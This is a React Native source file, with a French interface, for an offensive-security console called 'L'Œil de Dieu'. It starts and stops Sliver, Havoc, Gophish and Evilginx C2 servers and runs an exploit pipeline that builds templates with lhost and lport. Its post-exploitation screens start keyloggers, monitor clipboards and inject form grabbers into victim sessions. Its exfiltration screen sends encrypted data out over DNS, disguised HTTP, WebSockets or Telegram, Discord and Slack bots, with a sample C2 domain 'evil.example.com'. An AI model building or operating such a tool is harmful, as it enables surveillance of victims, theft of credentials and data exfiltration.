import React, { useState, useEffect, useCallback, useRef } from 'react';
import {
  View, Text, StyleSheet, ScrollView, TouchableOpacity,
  TextInput, ActivityIndicator,
} from 'react-native';
import { apiJSON, apiFetch } from '../utils/api';
import { colors } from '../utils/theme';

const C2_META = {
  sliver:   { icon: '🐍', color: '#10b981', label: 'Sliver C2',  port: 31337 },
  havoc:    { icon: '🔥', color: '#f97316', label: 'Havoc C2',   port: 40056 },
  gophish:  { icon: '🎣', color: '#38bdf8', label: 'Gophish',    port: 3333  },
  evilginx: { icon: '👁',  color: '#a78bfa', label: 'Evilginx',  port: 443   },
};

const LVL_COLORS = {
  1: '#38bdf8',
  2: '#a78bfa',
  3: '#f97316',
  4: '#10b981',
};

const PIPELINE_STAGES = [
  { id: 'fuzz',    icon: '🐛', label: 'Fuzzing',  endpoint: '/api/offensive/pipeline/fuzz' },
  { id: 'crash',   icon: '💢', label: 'Crash',    endpoint: '/api/offensive/pipeline/analyse-crash' },
  { id: 'reverse', icon: '🔬', label: 'Reverse',  endpoint: '/api/offensive/pipeline/reverse' },
  { id: 'exploit', icon: '💥', label: 'Exploit',  endpoint: '/api/offensive/pipeline/exploit-template' },
];

export default function OffensiveScreen() {
  const [tab,      setTab]      = useState('levels');
  const [levels,   setLevels]   = useState({});
  const [c2Status, setC2Status] = useState({});
  const [target,   setTarget]   = useState('');
  const [binary,   setBinary]   = useState('');
  const [terminal, setTerminal] = useState('L\'Œil de Dieu — Terminal offensif\nSélectionne un niveau ou lance le pipeline...\n');
  const [running,  setRunning]  = useState(false);
  const [activeLevel, setActive] = useState(null);
  const [c2Loading, setC2Loading] = useState({});
  const termRef = useRef(null);

  useEffect(() => {
    apiJSON('/api/offensive/levels').then(d => setLevels(d.levels || {})).catch(() => {});
    refreshC2();
  }, []);

  const refreshC2 = useCallback(async () => {
    try {
      const d = await apiJSON('/api/c2/');
      const map = {};
      (d.c2s || []).forEach(s => { map[s.name] = s; });
      setC2Status(map);
    } catch (_) {}
  }, []);

  useEffect(() => {
    const t = setInterval(refreshC2, 5000);
    return () => clearInterval(t);
  }, [refreshC2]);

  const log = (msg) => setTerminal(prev => prev + '\n' + msg);

  const runTool = async (level, tool, params = {}) => {
    setRunning(true);
    log(`\n[+] Lancement ${tool} (N${level})…`);
    try {
      const p = { ...params };
      if (target) p.target = target;
      if (binary) p.binary = binary;
      const d = await apiJSON('/api/offensive/run/tool', {
        method: 'POST',
        body: JSON.stringify({ level, tool, params: p }),
      });
      log(d.output || d.error || '(pas de sortie)');
      if (d.next_step) log(`\n[→] ${d.next_step}`);
    } catch (e) { log(`[!] ${e.message}`); }
    finally { setRunning(false); }
  };

  const runPipeline = async (stage) => {
    if (!binary && (stage !== 'fuzz')) { log('[!] Renseigne le binaire.'); return; }
    setRunning(true);
    log(`\n[+] Pipeline — stage: ${stage}${binary ? ` sur ${binary}` : ''}`);
    const ep = PIPELINE_STAGES.find(p => p.id === stage)?.endpoint;
    try {
      const body = stage === 'fuzz'
        ? { binary: binary || './target', corpus: '/tmp/corpus', output: '/tmp/fuzz_out', timeout: 20 }
        : stage === 'crash'
        ? { binary, crash: '/tmp/fuzz_out/default/crashes/id:000000' }
        : stage === 'exploit'
        ? { binary, offset: 0, lhost: target || '127.0.0.1', lport: 4444 }
        : { binary };
      const d = await apiJSON(ep, { method: 'POST', body: JSON.stringify(body) });
      log(d.output || d.gdb_trace || d.main_disasm || d.exploit_template || d.error || JSON.stringify(d, null, 2));
      if (d.next_step) log(`\n[→] ${d.next_step}`);
    } catch (e) { log(`[!] ${e.message}`); }
    finally { setRunning(false); }
  };

  const startC2 = async (name) => {
    setC2Loading(prev => ({ ...prev, [name]: true }));
    try {
      const d = await apiJSON('/api/c2/start', { method: 'POST', body: JSON.stringify({ name }) });
      log(`\n[C2] ${name.toUpperCase()}: ${d.message || d.error}`);
      refreshC2();
    } catch (e) { log(`[!] ${e.message}`); }
    setC2Loading(prev => ({ ...prev, [name]: false }));
  };

  const stopC2 = async (name) => {
    setC2Loading(prev => ({ ...prev, [name]: true }));
    try {
      const d = await apiJSON(`/api/c2/stop/${name}`, { method: 'POST' });
      log(`\n[C2] ${name.toUpperCase()}: ${d.message || d.error}`);
      refreshC2();
    } catch (e) { log(`[!] ${e.message}`); }
    setC2Loading(prev => ({ ...prev, [name]: false }));
  };

  return (
    <View style={s.container}>
      {/* Tabs */}
      <ScrollView horizontal showsHorizontalScrollIndicator={false} style={s.tabBar} contentContainerStyle={s.tabContent}>
        {[
          { id: 'levels',      label: '⚔️ Niveaux' },
          { id: 'c2',          label: '🧠 C2' },
          { id: 'pipeline',    label: '⚡ Pipeline' },
          { id: 'post-exploit',label: '🎯 PostEx' },
          { id: 'exfil',       label: '📤 Exfil' },
          { id: 'terminal',    label: '🖥 Terminal' },
        ].map(t => (
          <TouchableOpacity key={t.id} style={[s.tab, tab === t.id && s.tabActive]} onPress={() => setTab(t.id)}>
            <Text style={[s.tabText, tab === t.id && s.tabTextActive]}>{t.label}</Text>
          </TouchableOpacity>
        ))}
      </ScrollView>

      {/* Inputs globaux */}
      <View style={s.globalInputs}>
        <TextInput style={s.inputSmall} value={target} onChangeText={setTarget} placeholder="Cible (IP/domaine)" placeholderTextColor={colors.textDim} />
        <TextInput style={s.inputSmall} value={binary} onChangeText={setBinary} placeholder="Binaire (./target)" placeholderTextColor={colors.textDim} />
      </View>

      <ScrollView contentContainerStyle={s.list}>

        {/* ── NIVEAUX ── */}
        {tab === 'levels' && (
          <>
            {[1, 2, 3, 4].map(n => {
              const lvl = levels[n];
              if (!lvl) return <ActivityIndicator key={n} size="small" color={colors.accent} />;
              const col = LVL_COLORS[n];
              const isActive = activeLevel === n;
              return (
                <TouchableOpacity key={n} style={[s.lvlCard, { borderColor: isActive ? col : colors.border, backgroundColor: isActive ? col + '18' : colors.bgCard }]}
                  onPress={() => setActive(isActive ? null : n)}>
                  <View style={s.lvlHeader}>
                    <Text style={s.lvlIcon}>{lvl.icon}</Text>
                    <View style={{ flex: 1 }}>
                      <Text style={[s.lvlName, { color: col }]}>{lvl.name}</Text>
                      <Text style={s.lvlImpact}>{lvl.impact}</Text>
                    </View>
                    <View style={[s.lvlBadge, { backgroundColor: col + '30', borderColor: col + '60' }]}>
                      <Text style={[s.lvlBadgeText, { color: col }]}>N{n}</Text>
                    </View>
                  </View>
                  {isActive && (
                    <View style={s.toolsWrap}>
                      <Text style={s.toolsLabel}>OUTILS ({lvl.tools_count}) — tap pour lancer</Text>
                      <View style={s.toolsList}>
                        {(lvl.tools || []).map(t => (
                          <TouchableOpacity key={t.name} style={[s.toolChip, { borderColor: col + '50', backgroundColor: col + '12' }]}
                            onPress={() => { setTab('terminal'); runTool(n, t.name); }} disabled={running}>
                            <Text style={[s.toolChipText, { color: col }]}>{t.name}</Text>
                          </TouchableOpacity>
                        ))}
                      </View>
                    </View>
                  )}
                </TouchableOpacity>
              );
            })}
          </>
        )}

        {/* ── C2 ── */}
        {tab === 'c2' && (
          <>
            <View style={s.c2Header}>
              <Text style={s.c2Title}>🧠 C2 FRAMEWORKS</Text>
              <Text style={s.c2Sub}>Contrôle en temps réel</Text>
            </View>
            {Object.entries(C2_META).map(([name, meta]) => {
              const status = c2Status[name] || {};
              const isRunning = status.running;
              const isLoading = c2Loading[name];
              return (
                <View key={name} style={[s.c2Card, { borderColor: isRunning ? meta.color : colors.border, backgroundColor: isRunning ? meta.color + '12' : colors.bgCard }]}>
                  <View style={s.c2CardTop}>
                    <Text style={s.c2Icon}>{meta.icon}</Text>
                    <View style={{ flex: 1 }}>
                      <Text style={[s.c2Name, { color: meta.color }]}>{meta.label}</Text>
                      <Text style={s.c2Port}>{isRunning ? `PID ${status.pid} · port ${meta.port}` : `port ${meta.port}`}</Text>
                    </View>
                    <View style={[s.c2Dot, { backgroundColor: isRunning ? '#10b981' : colors.textDim }]} />
                  </View>
                  <View style={s.c2Actions}>
                    {!isRunning ? (
                      <TouchableOpacity style={[s.c2Btn, { borderColor: meta.color }]} onPress={() => startC2(name)} disabled={isLoading}>
                        <Text style={[s.c2BtnText, { color: meta.color }]}>{isLoading ? '…' : '▶ Start'}</Text>
                      </TouchableOpacity>
                    ) : (
                      <TouchableOpacity style={[s.c2Btn, { borderColor: colors.red }]} onPress={() => stopC2(name)} disabled={isLoading}>
                        <Text style={[s.c2BtnText, { color: colors.red }]}>{isLoading ? '…' : '■ Stop'}</Text>
                      </TouchableOpacity>
                    )}
                    <TouchableOpacity style={s.c2LogBtn} onPress={() => { setTab('terminal'); }}>
                      <Text style={s.c2LogBtnText}>📋 Logs</Text>
                    </TouchableOpacity>
                  </View>
                </View>
              );
            })}
          </>
        )}

        {/* ── PIPELINE ── */}
        {tab === 'pipeline' && (
          <>
            <View style={s.pipeHeader}>
              <Text style={s.pipeTitle}>⚡ PIPELINE EXPLOITATION</Text>
              <Text style={s.pipeSub}>Fuzzing → Crash → Reverse → Exploit</Text>
            </View>
            {PIPELINE_STAGES.map((stage, i) => (
              <View key={stage.id} style={s.pipeStageWrap}>
                <TouchableOpacity
                  style={[s.pipeStage, running && s.pipeStageOff]}
                  onPress={() => { setTab('terminal'); runPipeline(stage.id); }}
                  disabled={running}
                >
                  <Text style={s.pipeIcon}>{stage.icon}</Text>
                  <View style={{ flex: 1 }}>
                    <Text style={s.pipeLabel}>{stage.label}</Text>
                    <Text style={s.pipeDesc}>{stage.endpoint.split('/').pop()}</Text>
                  </View>
                  <Text style={s.pipeArrow}>▶</Text>
                </TouchableOpacity>
                {i < PIPELINE_STAGES.length - 1 && (
                  <View style={s.pipeConnector}>
                    <Text style={s.pipeConnectorText}>↓</Text>
                  </View>
                )}
              </View>
            ))}
            {!binary && (
              <View style={s.pipeHint}>
                <Text style={s.pipeHintText}>⚠️ Renseigne le chemin du binaire dans les champs ci-dessus.</Text>
              </View>
            )}
          </>
        )}

        {/* ── POST-EXPLOIT ── */}
        {tab === 'post-exploit' && <PostExploitTab log={log} setTab={setTab} />}

        {/* ── EXFIL ── */}
        {tab === 'exfil' && <ExfilTab log={log} setTab={setTab} />}

        {/* ── TERMINAL ── */}
        {tab === 'terminal' && (
          <View style={s.termWrap}>
            <View style={s.termHeader}>
              <Text style={s.termLabel}>TERMINAL</Text>
              {running && <Text style={s.termRunning}>● EN COURS</Text>}
              <TouchableOpacity style={s.clearBtn} onPress={() => setTerminal('Terminal effacé.\n')}>
                <Text style={s.clearBtnText}>Effacer</Text>
              </TouchableOpacity>
            </View>
            <ScrollView style={s.termScroll} ref={termRef} onContentSizeChange={() => termRef.current?.scrollToEnd({ animated: true })}>
              <Text style={s.termText}>{terminal}</Text>
            </ScrollView>
          </View>
        )}
      </ScrollView>
    </View>
  );
}

// ── Post-Exploit Tab ──────────────────────────────────────────────────────────

function PostExploitTab({ log, setTab }) {
  const [subTab,     setSubTab]     = useState('keylogger');
  const [sessionId,  setSessionId]  = useState('');
  const [keyLogs,    setKeyLogs]    = useState([]);
  const [clipboard,  setClipboard]  = useState([]);
  const [forms,      setForms]      = useState([]);
  const [keyRunning, setKeyRunning] = useState(false);
  const [clipMonitor,setClipMonitor]= useState(false);
  const [loading,    setLoading]    = useState(false);
  const pollRef = React.useRef(null);

  const startKeylogger = async () => {
    if (!sessionId.trim()) { Alert.alert('Erreur', 'Renseigne un Session ID.'); return; }
    setLoading(true);
    try {
      const d = await apiJSON('/api/post-exploit/keylogger/start', {
        method: 'POST', body: JSON.stringify({ session_id: sessionId }),
      });
      setKeyRunning(true);
      log(`\n[KeyLog] Démarré — job ${d.job_id}`);
      setTab('terminal');
    } catch (e) { Alert.alert('Erreur', e.message); }
    finally { setLoading(false); }
  };

  const stopKeylogger = async () => {
    setLoading(true);
    try {
      const d = await apiJSON(`/api/post-exploit/keylogger/stop/${sessionId}`, { method: 'POST' });
      setKeyRunning(false);
      const keystrokes = d.keystrokes || '';
      setKeyLogs(prev => [...prev, { ts: new Date().toISOString(), content: keystrokes }]);
      log(`\n[KeyLog] Arrêté — ${keystrokes.length} chars capturés`);
    } catch (e) { Alert.alert('Erreur', e.message); }
    finally { setLoading(false); }
  };

  const captureClipboard = async () => {
    setLoading(true);
    try {
      const d = await apiJSON('/api/post-exploit/clipboard/capture', {
        method: 'POST', body: JSON.stringify({ session_id: sessionId || 'local' }),
      });
      setClipboard(prev => [{ ts: d.captured_at, content: d.content, type: d.content_type }, ...prev].slice(0, 20));
    } catch (e) { Alert.alert('Erreur', e.message); }
    finally { setLoading(false); }
  };

  const toggleClipMonitor = () => {
    if (clipMonitor) {
      clearInterval(pollRef.current);
      setClipMonitor(false);
    } else {
      pollRef.current = setInterval(captureClipboard, 5000);
      setClipMonitor(true);
    }
  };

  useEffect(() => () => clearInterval(pollRef.current), []);

  const getForms = async () => {
    try {
      const d = await apiJSON(`/api/post-exploit/formgrabber/forms/${sessionId || 'local'}`);
      setForms(d.forms || d || []);
    } catch (_) {}
  };

  const injectFormGrabber = async () => {
    setLoading(true);
    try {
      const d = await apiJSON('/api/post-exploit/formgrabber/inject', {
        method: 'POST', body: JSON.stringify({ session_id: sessionId }),
      });
      Alert.alert('Form Grabber', d.injected ? '✅ Injecté avec succès' : '⚠️ ' + (d.method_used || 'Échec'));
    } catch (e) { Alert.alert('Erreur', e.message); }
    finally { setLoading(false); }
  };

  return (
    <View style={{ flex: 1 }}>
      {/* Sub-tabs */}
      <ScrollView horizontal showsHorizontalScrollIndicator={false} style={pe.subTabBar} contentContainerStyle={pe.subTabRow}>
        {[
          { id: 'keylogger', label: '⌨️ Keylogger' },
          { id: 'clipboard', label: '📋 Clipboard' },
          { id: 'forms',     label: '📝 Forms' },
        ].map(t => (
          <TouchableOpacity key={t.id} style={[pe.subTab, subTab === t.id && pe.subTabActive]} onPress={() => setSubTab(t.id)}>
            <Text style={[pe.subTabText, subTab === t.id && pe.subTabTextActive]}>{t.label}</Text>
          </TouchableOpacity>
        ))}
      </ScrollView>

      <ScrollView contentContainerStyle={{ padding: 14, gap: 10, paddingBottom: 32 }}>
        {/* Session input */}
        <TextInput
          style={s.inputSmall}
          value={sessionId}
          onChangeText={setSessionId}
          placeholder="Session ID (ex: abc123)"
          placeholderTextColor={colors.textDim}
        />

        {/* Keylogger */}
        {subTab === 'keylogger' && (
          <>
            <View style={pe.btnRow}>
              {!keyRunning ? (
                <TouchableOpacity style={[pe.btn, { borderColor: colors.green }]} onPress={startKeylogger} disabled={loading}>
                  <Text style={[pe.btnText, { color: colors.green }]}>{loading ? '…' : '▶ Start Keylogger'}</Text>
                </TouchableOpacity>
              ) : (
                <TouchableOpacity style={[pe.btn, { borderColor: colors.red }]} onPress={stopKeylogger} disabled={loading}>
                  <Text style={[pe.btnText, { color: colors.red }]}>{loading ? '…' : '■ Stop & Dump'}</Text>
                </TouchableOpacity>
              )}
              {keyRunning && <View style={pe.runningDot} />}
            </View>

            {keyLogs.length === 0
              ? <Text style={s.termText}>Aucune capture de touches.</Text>
              : keyLogs.map((l, i) => (
                <View key={i} style={pe.logBlock}>
                  <Text style={pe.logTs}>{new Date(l.ts).toLocaleString('fr-FR')}</Text>
                  <ScrollView style={pe.logScroll}>
                    <Text style={pe.logText}>{l.content || '(vide)'}</Text>
                  </ScrollView>
                </View>
              ))
            }
          </>
        )}

        {/* Clipboard */}
        {subTab === 'clipboard' && (
          <>
            <View style={pe.btnRow}>
              <TouchableOpacity style={pe.btn} onPress={captureClipboard} disabled={loading}>
                <Text style={pe.btnText}>{loading ? '…' : '📋 Capturer maintenant'}</Text>
              </TouchableOpacity>
              <TouchableOpacity style={[pe.btn, clipMonitor && { borderColor: colors.green }]} onPress={toggleClipMonitor}>
                <Text style={[pe.btnText, clipMonitor && { color: colors.green }]}>
                  {clipMonitor ? '● Monitor ON' : 'Monitor'}
                </Text>
              </TouchableOpacity>
            </View>

            {clipboard.length === 0
              ? <Text style={{ color: colors.textMuted, textAlign: 'center', marginTop: 20 }}>Aucun contenu.</Text>
              : clipboard.map((c, i) => (
                <View key={i} style={pe.clipCard}>
                  <View style={{ flexDirection: 'row', justifyContent: 'space-between' }}>
                    <Text style={pe.clipType}>{c.type || 'text'}</Text>
                    <Text style={pe.clipTs}>{new Date(c.ts).toLocaleTimeString('fr-FR')}</Text>
                  </View>
                  <Text style={pe.clipContent} numberOfLines={4}>{c.content}</Text>
                </View>
              ))
            }
          </>
        )}

        {/* Form Grabber */}
        {subTab === 'forms' && (
          <>
            <View style={pe.btnRow}>
              <TouchableOpacity style={[pe.btn, { borderColor: '#a78bfa' }]} onPress={injectFormGrabber} disabled={loading}>
                <Text style={[pe.btnText, { color: '#a78bfa' }]}>{loading ? '…' : '💉 Injecter Form Grabber'}</Text>
              </TouchableOpacity>
              <TouchableOpacity style={pe.btn} onPress={getForms}>
                <Text style={pe.btnText}>↻ Charger</Text>
              </TouchableOpacity>
            </View>

            {forms.length === 0
              ? <Text style={{ color: colors.textMuted, textAlign: 'center', marginTop: 20 }}>Aucun formulaire capturé.</Text>
              : forms.map((f, i) => (
                <View key={i} style={pe.formCard}>
                  <Text style={pe.formUrl} numberOfLines={1}>{f.url || 'URL inconnue'}</Text>
                  <Text style={pe.formData}>{JSON.stringify(f.form_data, null, 2)}</Text>
                  <Text style={pe.clipTs}>{new Date(f.captured_at).toLocaleString('fr-FR')}</Text>
                </View>
              ))
            }
          </>
        )}
      </ScrollView>
    </View>
  );
}

// ── Exfil Tab ─────────────────────────────────────────────────────────────────

const EXFIL_CHANNELS = [
  { id: 'dns',    label: '🌐 DNS',       color: '#60a5fa' },
  { id: 'http',   label: '🌍 HTTP',      color: '#34d399' },
  { id: 'ws',     label: '🔌 WebSocket', color: '#a78bfa' },
  { id: 'social', label: '📱 Social',    color: '#f97316' },
];

const DISGUISE_MODES = ['json', 'form', 'base64_img', 'cookie'];
const SOCIAL_PLAT   = ['telegram', 'discord', 'slack'];

function ExfilTab({ log, setTab }) {
  const [channel,    setChannel]    = useState('dns');
  const [domain,     setDomain]     = useState('');
  const [dnsServer,  setDnsServer]  = useState('8.8.8.8');
  const [endpoint,   setEndpoint]   = useState('');
  const [method,     setMethod]     = useState('POST');
  const [disguise,   setDisguise]   = useState('json');
  const [wsUrl,      setWsUrl]      = useState('');
  const [platform,   setPlatform]   = useState('telegram');
  const [apiKey,     setApiKey]     = useState('');
  const [chanTarget, setChanTarget] = useState('');
  const [data,       setData]       = useState('test payload');
  const [compress,   setCompress]   = useState(false);
  const [encrypt,    setEncrypt]    = useState(true);
  const [jobs,       setJobs]       = useState([]);
  const [testing,    setTesting]    = useState(false);
  const [sending,    setSending]    = useState(false);
  const [testResult, setTestResult] = useState(null);

  useEffect(() => {
    apiJSON('/api/exfil/jobs').then(d => setJobs(d.jobs || d || [])).catch(() => {});
  }, []);

  const buildBody = () => {
    const base64Data = btoa(data);
    if (channel === 'dns')    return { data_b64: base64Data, domain, dns_server: dnsServer, encrypt, compress };
    if (channel === 'http')   return { data_b64: base64Data, endpoint, method, disguise, encrypt, compress };
    if (channel === 'ws')     return { data_b64: base64Data, ws_url: wsUrl, encrypt, compress };
    if (channel === 'social') return { data_b64: base64Data, platform, api_key: apiKey, channel: chanTarget, encrypt, compress };
    return { data_b64: base64Data };
  };

  const testChannel = async () => {
    setTesting(true); setTestResult(null);
    try {
      const d = await apiJSON(`/api/exfil/test/${channel}`, {
        method: 'POST', body: JSON.stringify({ config: buildBody() }),
      });
      setTestResult(d);
    } catch (e) { setTestResult({ error: e.message }); }
    finally { setTesting(false); }
  };

  const sendExfil = async () => {
    setSending(true);
    try {
      const d = await apiJSON(`/api/exfil/${channel}`, {
        method: 'POST', body: JSON.stringify(buildBody()),
      });
      log(`\n[Exfil] ${channel.toUpperCase()}: ${d.chunks_sent ?? 0}/${d.chunks_total ?? 0} chunks`);
      setTab('terminal');
      apiJSON('/api/exfil/jobs').then(j => setJobs(j.jobs || j || [])).catch(() => {});
    } catch (e) { Alert.alert('Erreur', e.message); }
    finally { setSending(false); }
  };

  const chanMeta = EXFIL_CHANNELS.find(c => c.id === channel);

  return (
    <ScrollView contentContainerStyle={{ padding: 14, gap: 12, paddingBottom: 40 }}>

      {/* Channel selector */}
      <View style={{ flexDirection: 'row', gap: 8, flexWrap: 'wrap' }}>
        {EXFIL_CHANNELS.map(c => (
          <TouchableOpacity key={c.id} style={[ex.chanBtn, channel === c.id && { borderColor: c.color, backgroundColor: c.color + '20' }]}
            onPress={() => setChannel(c.id)}>
            <Text style={[ex.chanLabel, channel === c.id && { color: c.color }]}>{c.label}</Text>
          </TouchableOpacity>
        ))}
      </View>

      {/* Channel-specific config */}
      {channel === 'dns' && (
        <>
          <TextInput style={s.inputSmall} value={domain} onChangeText={setDomain} placeholder="Domaine C2 (ex: evil.example.com)" placeholderTextColor={colors.textDim} />
          <TextInput style={s.inputSmall} value={dnsServer} onChangeText={setDnsServer} placeholder="DNS serveur (8.8.8.8)" placeholderTextColor={colors.textDim} />
        </>
      )}
      {channel === 'http' && (
        <>
          <TextInput style={s.inputSmall} value={endpoint} onChangeText={setEndpoint} placeholder="Endpoint URL" placeholderTextColor={colors.textDim} />
          <View style={{ flexDirection: 'row', gap: 6 }}>
            {DISGUISE_MODES.map(d => (
              <TouchableOpacity key={d} style={[ex.miniBtn, disguise === d && ex.miniBtnActive]} onPress={() => setDisguise(d)}>
                <Text style={[ex.miniBtnText, disguise === d && ex.miniBtnTextActive]}>{d}</Text>
              </TouchableOpacity>
            ))}
          </View>
        </>
      )}
      {channel === 'ws' && (
        <TextInput style={s.inputSmall} value={wsUrl} onChangeText={setWsUrl} placeholder="ws://... ou wss://..." placeholderTextColor={colors.textDim} />
      )}
      {channel === 'social' && (
        <>
          <View style={{ flexDirection: 'row', gap: 6 }}>
            {SOCIAL_PLAT.map(p => (
              <TouchableOpacity key={p} style={[ex.miniBtn, platform === p && ex.miniBtnActive]} onPress={() => setPlatform(p)}>
                <Text style={[ex.miniBtnText, platform === p && ex.miniBtnTextActive]}>{p}</Text>
              </TouchableOpacity>
            ))}
          </View>
          <TextInput style={s.inputSmall} value={apiKey} onChangeText={setApiKey} placeholder="Bot Token / API Key" placeholderTextColor={colors.textDim} secureTextEntry />
          <TextInput style={s.inputSmall} value={chanTarget} onChangeText={setChanTarget} placeholder="Channel ID / Chat ID" placeholderTextColor={colors.textDim} />
        </>
      )}

      {/* Data */}
      <TextInput
        style={[s.inputSmall, { height: 80, textAlignVertical: 'top' }]}
        value={data}
        onChangeText={setData}
        placeholder="Données à exfiltrer…"
        placeholderTextColor={colors.textDim}
        multiline
      />

      {/* Options */}
      <View style={{ flexDirection: 'row', gap: 10 }}>
        <TouchableOpacity style={[ex.optBtn, compress && ex.optBtnActive]} onPress={() => setCompress(v => !v)}>
          <Text style={[ex.optText, compress && ex.optTextActive]}>🗜 Compresser</Text>
        </TouchableOpacity>
        <TouchableOpacity style={[ex.optBtn, encrypt && ex.optBtnActive]} onPress={() => setEncrypt(v => !v)}>
          <Text style={[ex.optText, encrypt && ex.optTextActive]}>🔒 Chiffrer</Text>
        </TouchableOpacity>
      </View>

      {/* Test result */}
      {testResult && (
        <View style={[ex.resultBox, { borderColor: testResult.error ? colors.red : colors.green }]}>
          {testResult.error
            ? <Text style={{ color: colors.red, fontSize: 12 }}>❌ {testResult.error}</Text>
            : <Text style={{ color: colors.green, fontSize: 12 }}>✅ Canal fonctionnel · {testResult.result?.chunks_sent ?? 1} chunk(s)</Text>
          }
        </View>
      )}

      {/* Actions */}
      <View style={{ flexDirection: 'row', gap: 10 }}>
        <TouchableOpacity style={[ex.actionBtn, { borderColor: colors.textDim }]} onPress={testChannel} disabled={testing}>
          <Text style={{ color: colors.textMuted, fontSize: 13, fontWeight: '700' }}>{testing ? '…' : '🧪 Tester'}</Text>
        </TouchableOpacity>
        <TouchableOpacity style={[ex.actionBtn, { borderColor: chanMeta?.color, backgroundColor: chanMeta?.color + '20', flex: 1 }]} onPress={sendExfil} disabled={sending}>
          <Text style={{ color: chanMeta?.color, fontSize: 13, fontWeight: '700' }}>{sending ? '…' : '📤 Exfiltrer'}</Text>
        </TouchableOpacity>
      </View>

      {/* Jobs history */}
      {jobs.length > 0 && (
        <>
          <Text style={{ color: colors.textMuted, fontSize: 11, letterSpacing: 1, marginTop: 8 }}>HISTORIQUE</Text>
          {jobs.slice(0, 8).map(j => (
            <View key={j.exfil_id || j.id} style={ex.jobRow}>
              <Text style={[ex.jobChannel, { color: EXFIL_CHANNELS.find(c => c.id === j.channel)?.color || colors.textMuted }]}>
                {j.channel?.toUpperCase()}
              </Text>
              <Text style={ex.jobStatus}>{j.status}</Text>
              <Text style={ex.jobChunks}>{j.chunks_sent ?? 0}/{j.chunks_total ?? 0}</Text>
              <Text style={ex.jobTs}>{new Date(j.created_at).toLocaleTimeString('fr-FR')}</Text>
            </View>
          ))}
        </>
      )}
    </ScrollView>
  );
}

const pe = StyleSheet.create({
  subTabBar: { backgroundColor: colors.bgCard, borderBottomWidth: 1, borderBottomColor: colors.border, flexGrow: 0 },
  subTabRow: { flexDirection: 'row', paddingHorizontal: 8, paddingVertical: 4 },
  subTab: { paddingHorizontal: 16, paddingVertical: 10 },
  subTabActive: { borderBottomWidth: 2, borderBottomColor: '#f97316' },
  subTabText: { color: colors.textMuted, fontSize: 13 },
  subTabTextActive: { color: '#f97316', fontWeight: '700' },
  btnRow: { flexDirection: 'row', gap: 8, alignItems: 'center' },
  btn: { paddingHorizontal: 14, paddingVertical: 10, borderRadius: 10, borderWidth: 1, borderColor: colors.accent },
  btnText: { color: colors.accent, fontSize: 12, fontWeight: '700' },
  runningDot: { width: 8, height: 8, borderRadius: 4, backgroundColor: colors.green },
  logBlock: { backgroundColor: '#00000060', borderRadius: 10, borderWidth: 1, borderColor: colors.border, overflow: 'hidden' },
  logTs: { color: colors.textDim, fontSize: 10, padding: 6, borderBottomWidth: 1, borderBottomColor: colors.border },
  logScroll: { maxHeight: 120 },
  logText: { color: '#7fffb0', fontSize: 11, fontFamily: 'monospace', padding: 8, lineHeight: 16 },
  clipCard: { backgroundColor: colors.bgCard, borderRadius: 10, padding: 12, borderWidth: 1, borderColor: colors.border, gap: 4 },
  clipType: { color: colors.accent, fontSize: 11, fontWeight: '600' },
  clipTs: { color: colors.textDim, fontSize: 11 },
  clipContent: { color: colors.text, fontSize: 12, fontFamily: 'monospace' },
  formCard: { backgroundColor: colors.bgCard, borderRadius: 10, padding: 12, borderWidth: 1, borderColor: '#a78bfa50', gap: 4 },
  formUrl: { color: '#a78bfa', fontSize: 12, fontFamily: 'monospace' },
  formData: { color: colors.textMuted, fontSize: 11, fontFamily: 'monospace' },
});

const ex = StyleSheet.create({
  chanBtn: { paddingHorizontal: 14, paddingVertical: 9, borderRadius: 20, borderWidth: 1, borderColor: colors.border, backgroundColor: colors.bgCard },
  chanLabel: { color: colors.textMuted, fontSize: 13, fontWeight: '600' },
  miniBtn: { paddingHorizontal: 10, paddingVertical: 6, borderRadius: 8, borderWidth: 1, borderColor: colors.border },
  miniBtnActive: { borderColor: colors.accent, backgroundColor: colors.accent + '20' },
  miniBtnText: { color: colors.textMuted, fontSize: 11 },
  miniBtnTextActive: { color: colors.accent, fontWeight: '700' },
  optBtn: { paddingHorizontal: 12, paddingVertical: 8, borderRadius: 8, borderWidth: 1, borderColor: colors.border },
  optBtnActive: { borderColor: colors.green, backgroundColor: colors.green + '15' },
  optText: { color: colors.textMuted, fontSize: 12 },
  optTextActive: { color: colors.green, fontWeight: '700' },
  resultBox: { padding: 12, borderRadius: 10, borderWidth: 1, backgroundColor: colors.bgCard },
  actionBtn: { flex: 1, paddingVertical: 12, borderRadius: 10, borderWidth: 1, alignItems: 'center' },
  jobRow: { flexDirection: 'row', gap: 10, alignItems: 'center', paddingVertical: 6, borderBottomWidth: 1, borderBottomColor: colors.border + '30' },
  jobChannel: { fontSize: 11, fontWeight: '700', width: 50, fontFamily: 'monospace' },
  jobStatus: { color: colors.textMuted, fontSize: 11, flex: 1 },
  jobChunks: { color: colors.accent, fontSize: 11, fontFamily: 'monospace' },
  jobTs: { color: colors.textDim, fontSize: 10 },
});

const s = StyleSheet.create({
  container: { flex: 1, backgroundColor: colors.bg },
  tabBar: { backgroundColor: colors.bgCard, borderBottomWidth: 1, borderBottomColor: colors.border, flexGrow: 0 },
  tabContent: { flexDirection: 'row', paddingHorizontal: 8, paddingVertical: 4 },
  tab: { paddingHorizontal: 14, paddingVertical: 12 },
  tabActive: { borderBottomWidth: 2, borderBottomColor: '#f97316' },
  tabText: { color: colors.textMuted, fontSize: 13 },
  tabTextActive: { color: '#f97316', fontWeight: '700' },
  globalInputs: {
    flexDirection: 'row', gap: 8, padding: 10,
    backgroundColor: colors.bgCard, borderBottomWidth: 1, borderBottomColor: colors.border,
  },
  inputSmall: {
    flex: 1, backgroundColor: colors.bg, borderWidth: 1, borderColor: colors.border,
    borderRadius: 8, paddingHorizontal: 10, paddingVertical: 8,
    color: colors.text, fontSize: 12, fontFamily: 'monospace',
  },
  list: { padding: 12, gap: 10, paddingBottom: 32 },
  // Levels
  lvlCard: { borderRadius: 12, padding: 14, borderWidth: 1, gap: 10 },
  lvlHeader: { flexDirection: 'row', alignItems: 'center', gap: 10 },
  lvlIcon: { fontSize: 22 },
  lvlName: { fontSize: 14, fontWeight: '700', letterSpacing: 0.5 },
  lvlImpact: { color: colors.textDim, fontSize: 11, marginTop: 2 },
  lvlBadge: { paddingHorizontal: 8, paddingVertical: 4, borderRadius: 12, borderWidth: 1 },
  lvlBadgeText: { fontSize: 11, fontWeight: '700' },
  toolsWrap: { gap: 6 },
  toolsLabel: { color: colors.textDim, fontSize: 10, letterSpacing: 1, textTransform: 'uppercase' },
  toolsList: { flexDirection: 'row', flexWrap: 'wrap', gap: 6 },
